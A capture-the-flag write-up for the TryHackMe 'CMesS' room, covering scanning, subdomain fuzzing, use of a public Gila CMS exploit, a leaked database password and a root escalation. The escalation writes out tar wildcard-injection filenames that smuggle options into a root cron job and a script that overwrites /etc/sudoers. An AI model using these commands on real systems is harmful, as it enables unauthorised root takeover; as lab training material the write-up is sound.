> [!NOTE]
> https://tryhackme.com/room/cmess
> IP:10.10.206.203
> Please add `10.10.206.203 cmess.thm` to /etc/hosts

```bash
echo "10.10.206.203    cmess.thm" >> /etc/hosts
```

# NMAP
```bash
sudo nmap -p- -sC -sV -Pn 10.10.206.203 -T5 -v
```

```resoults
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 d9:b6:52:d3:93:9a:38:50:b4:23:3b:fd:21:0c:05:1f (RSA)
|   256 21:c3:6e:31:8b:85:22:8a:6d:72:86:8f:ae:64:66:2b (ECDSA)
|_  256 5b:b9:75:78:05:d7:ec:43:30:96:17:ff:c6:a8:6c:ed (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-generator: Gila CMS
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
| http-robots.txt: 3 disallowed entries 
|_/src/ /themes/ /lib/
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
|_http-server-header: Apache/2.4.18 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

# web
![CMesS](https://raw.githubusercontent.com/GooseGusevich/Tryhackme/refs/heads/main/CMesS/screenshots/20250511153124.png)


## Dirsearch
```bash
dirserach -u http://cmess.thm/
```
![CMesS](https://raw.githubusercontent.com/GooseGusevich/Tryhackme/refs/heads/main/CMesS/screenshots/20250511154302.png)

![[20250511154326.png]]
## FFUF
```bash
ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt -u http://cmess.thm/ -H "Host:FUZZ.cmess.thm" -ic -c -fw 522
```

![CMesS](https://raw.githubusercontent.com/GooseGusevich/Tryhackme/refs/heads/main/CMesS/screenshots/20250511154149.png)

# RCE
![CMesS](https://raw.githubusercontent.com/GooseGusevich/Tryhackme/refs/heads/main/CMesS/screenshots/20250511154449.png)

## searchcploit
```bash
searchcploit 1.10.9
```

![CMesS](https://raw.githubusercontent.com/GooseGusevich/Tryhackme/refs/heads/main/CMesS/screenshots/20250511154613.png)

```bash
searchsploit -p 51569
```

```bash
cp /usr/share/exploitdb/exploits/php/webapps/51569.py Desktop/exploit.py
```

```bash
chmod +x exploit.py
```

![CMesS](https://raw.githubusercontent.com/GooseGusevich/Tryhackme/refs/heads/main/CMesS/screenshots/20250511155117.png)

# LPE
```
andre:x:1000:1000:andre,,,:/home/andre:/bin/bash
```
### config.php
```
   'host' => 'localhost',
    'user' => 'root',
    'pass' => 'r0otus3rpassw0rd',
    'name' => 'gila',
  ),
```
![CMesS](https://raw.githubusercontent.com/GooseGusevich/Tryhackme/refs/heads/main/CMesS/screenshots/0250511155440.png)

![CMesS](https://raw.githubusercontent.com/GooseGusevich/Tryhackme/refs/heads/main/CMesS/screenshots/20250511155546.png)


![CMesS](https://raw.githubusercontent.com/GooseGusevich/Tryhackme/refs/heads/main/CMesS/screenshots/20250511155707.png)

## Flag1
![CMesS](https://raw.githubusercontent.com/GooseGusevich/Tryhackme/refs/heads/main/CMesS/screenshots/20250511155841.png)
## andre to root
```bash
uname -a
```

```resoults
Linux cmess 4.4.0-142-generic #168-Ubuntu SMP Wed Jan 16 21:00:45 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux
```

![CMesS](https://raw.githubusercontent.com/GooseGusevich/Tryhackme/refs/heads/main/CMesS/screenshots/20250511160242.png)

```
*/2 *   * * *   root    cd /home/andre/backup && tar -zcf /tmp/andre_backup.tar.gz *
```

```bash
cd /home/andre/backup 
```

```bash
echo "" > "--checkpoint-action=exec=sh sudo.sh"
echo "" > "--checkpoint=1"
```

```bash
echo "echo 'andre ALL=(root) NOPASSWD: ALL ' > /etc/sudoers" > sudo.sh
```

```bash
sudo /bin/bash
```
# flag 2
![CMesS](https://raw.githubusercontent.com/GooseGusevich/Tryhackme/refs/heads/main/CMesS/screenshots/20250511173108.png)